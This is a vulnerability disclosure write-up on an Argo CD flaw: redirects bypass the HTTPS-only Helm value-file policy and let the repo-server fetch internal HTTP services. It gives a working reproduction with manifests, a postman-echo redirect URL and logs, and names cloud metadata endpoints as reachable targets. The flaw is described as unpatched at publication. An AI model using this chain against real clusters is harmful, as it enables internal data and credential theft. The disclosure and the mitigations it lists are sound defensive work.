# HTTPS-only Helm values policy bypass via redirects permits internal HTTP fetches

**Status:** Reported privately to the Argo CD maintainers on 2026-11-12 via
[GHSA-h5rm-hj79-76cf](https://github.com/argoproj/argo-cd/security/advisories/GHSA-h5rm-hj79-76cf).
The advisory is still in `triage` with no fix or mitigation plan as of
2026-11-14. This writeup was published on 2026-11-14. The end-to-end
automation is withheld until a fix ships.

## Summary

I found that Argo CD's `helm.valuesFileSchemes` setting, the documented
allow-list for remote Helm value files, is enforced only on the **initial**
URL. With `helm.valuesFileSchemes: https`, Argo CD rejects a direct `http://`
value file, but it passes the URL unchanged to `helm template --values <url>`.
Helm's HTTP getter follows redirects without re-checking the scheme, so an
`https://` URL that returns `302 Location: http://internal/...` makes the
repo-server fetch an internal HTTP resource. I reproduced this with a chart
that renders the fetched mapping; the response appears in the application's
desired manifests and is readable through `argocd app manifests` without
syncing.

This bypasses an explicitly configured HTTPS-only restriction. It is not a
claim of general internal-network isolation: `https`-only still permits
internal HTTPS destinations.

## Affected versions

- I reproduced this on `v3.5.4`.
- I reviewed the source at `v3.6.1`
  (`94037c4d4e1af4bd0651d37a179fbd9e347e668c`) and found
  `ResolveValueFilePathOrUrl` and the `--values` loop byte-identical to
  `v3.5.4`; `getResolvedValueFiles` is identical apart from a line offset.
- I also ran a direct Helm 4.3.1 test (the version shipped with `v3.6.1`); it
  follows the redirect. This is a dependency-level test, not an end-to-end
  Argo CD v3.6.1 run.
- I did not individually test other versions with remote value files and
  `helm.valuesFileSchemes`; they are likely affected.

## Impact

An authenticated user with `applications create` (or `update`) in a project —
not a cluster admin — can make the repo-server issue GET requests to internal
HTTP services reachable from the repo-server. With a chart that renders the
fetched mapping (or write access to an allowed chart repo), the response is
readable through `argocd app manifests`. I demonstrated this with a
project-scoped user holding only `create`/`get`; the marker was readable
without a sync. Without such a chart the primitive is blind SSRF.

The project `sourceRepos` allow-list does not cover the value-file URL. This can
reach internal APIs, the Kubernetes API where anonymous access exists, and
metadata endpoints that accept a plain GET (EC2 IMDSv1 if not disabled; the ECS
task metadata endpoint at `/v2/metadata`). Endpoints that require a token or a
custom header (IMDSv2, GCP, Azure) are not directly readable, and ECS task
credentials require the per-task relative URI.

## Reproduction (v3.5.4)

I set up a k3d single-node lab with Argo CD v3.5.4.

### `argocd-cm`

```yaml
data:
  helm.valuesFileSchemes: https
```

### AppProject

```yaml
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: restricted
  namespace: argocd
spec:
  sourceRepos:
    - "git://gitd.argocd.svc:9418/ssrf.git"
  destinations:
    - namespace: team-a
      server: https://kubernetes.default.svc
  clusterResourceWhitelist: []
  namespaceResourceWhitelist:
    - group: ""
      kind: ConfigMap
```

### Chart (`ssrf.git`)

`Chart.yaml`:

```yaml
apiVersion: v2
name: ssrf
version: 0.1.0
```

`templates/cm.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{{ .Values.name }}"
data:
  marker: "{{ .Values.marker }}"
```

### Internal service

I ran an internal service that returns
`{"marker":"SSRF_REDIRECT_HTTPS_BYPASS_2026"}` over plain HTTP on port 80,
reachable only from the repo-server's network position.

### Application

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: ssrf-nosync
  namespace: argocd
spec:
  project: restricted
  source:
    repoURL: git://gitd.argocd.svc:9418/ssrf.git
    targetRevision: master
    path: .
    helm:
      valueFiles:
        - https://postman-echo.com/redirect-to?url=http%3A%2F%2Finternal-secret.default.svc%2Fsecret.json
      parameters:
        - name: name
          value: ssrf-nosync-result-<nonce>
  destination:
    server: https://kubernetes.default.svc
    namespace: team-a
```

### Steps

1. I created `ssrf-direct` with `http://internal-secret.default.svc/secret.json`
   directly as `helm.valueFiles`; it failed with
   `ComparisonError: the URL scheme 'http' is not allowed`.
2. I created `ssrf-nosync` with the redirect URL; the repo-server logged
   `resolved value files: [https://postman-echo.com/...]` and
   `helm template ... --values https://postman-echo.com/...`, and the internal
   service logged `GET /secret.json` from the repo-server pod IP.
3. I created the Application as a local `appauthor` with only
   `applications create` and `get` on `restricted/*`. The fetch happened during
   application creation/initial reconciliation; `argocd app manifests` returned
   the marker; `status.operationState` and `status.history` were empty and the
   rendered ConfigMap was absent, so no sync occurred.

### Observed logs

Direct HTTP (negative control):

```
Failed to load target state: failed to generate manifest for source 1 of 1:
rpc error: code = Unknown desc = Manifest generation error (cached): error
resolving helm value files: error resolving value file path:
the URL scheme 'http' is not allowed
```

Redirect:

```
=== fetch observed: yes ===
=== app manifests (read-only, no sync) ===
apiVersion: v1
data:
  marker: SSRF_REDIRECT_HTTPS_BYPASS_2026
kind: ConfigMap
=== app operationState (must be empty: no sync) ===

=== app sync history (must be empty: no sync) ===

=== internal-secret access log tail ===
10.42.0.20 - - [12/Nov/2026 07:59:08] "GET /secret.json HTTP/1.1" 200 -
=== repo-server log ===
{"level":"info","msg":"resolved value files: [https://postman-echo.com/redirect-to?url=http%3A%2F%2Finternal-secret.default.svc%2Fsecret.json]","time":"2026-11-12T07:59:08Z"}
{"level":"info","msg":"helm template . --name-template ssrf-nosync ... --set name=ssrf-nosync-result-1794470347 --values https://postman-echo.com/redirect-to?url=... --api-versions ..."}
```

## Root cause

```go
// util/io/path/resolved.go:112 (v3.6.1)
func ResolveValueFilePathOrUrl(appPath, repoRoot, valueFile string, allowedURLSchemes []string) (resolvedPath ResolvedFilePath, isRemote bool, err error) {
	url, err := url.Parse(valueFile)
	if err == nil {
		if url.Scheme != "" {
			if isURLSchemeAllowed(url.Scheme, allowedURLSchemes) {
				return ResolvedFilePath(valueFile), true, nil
			}
			return "", false, fmt.Errorf("the URL scheme '%s' is not allowed", url.Scheme)
		}
	}
	...
}
```

I traced the URL to Helm unchanged (`util/helm/cmd.go:453`), and Helm follows
the redirect.

## Suggested fix

I suggest fetching remote value files in the repo-server with an HTTP client
whose `CheckRedirect` re-applies the allowed-scheme policy (or rejects
cross-scheme redirects), then passing a local file to Helm. Alternatively,
reject redirects at the Helm invocation boundary. This restores the scheme
policy; it does not prevent all SSRF, since internal HTTPS destinations remain
reachable under an `https`-only policy.

## Evidence

The key observations are quoted above: the direct `http` value file is
rejected, while the redirecting `https` value file is fetched by the
repo-server and the marker appears in the application's manifests without a
sync. The full lab logs and the end-to-end automation are available to the
maintainers; the automation will be published after a fix ships.

## Disclosure timeline

- 2026-11-12: report submitted through the GitHub private advisory form; a
  24-hour publication notice was posted in the advisory.
- 2026-11-13: voluntary one-day extension to give the maintainers time to
  respond.
- 2026-11-14: published with no fix or mitigation plan available. The advisory
  remains private and in `triage`.

## Operator mitigation

Until a fix is available, disable remote value files with
`helm.valuesFileSchemes: ""`, or restrict repo-server egress to the endpoints
it actually needs. The `https`-only setting is not a network-isolation control:
it still permits internal HTTPS destinations.

## Credit

Reported by iota31.

## AI assistance

AI assistance was used for lab automation and drafting. I verified the
reproduction, reviewed every claim against the captured evidence, and am
responsible for the content.
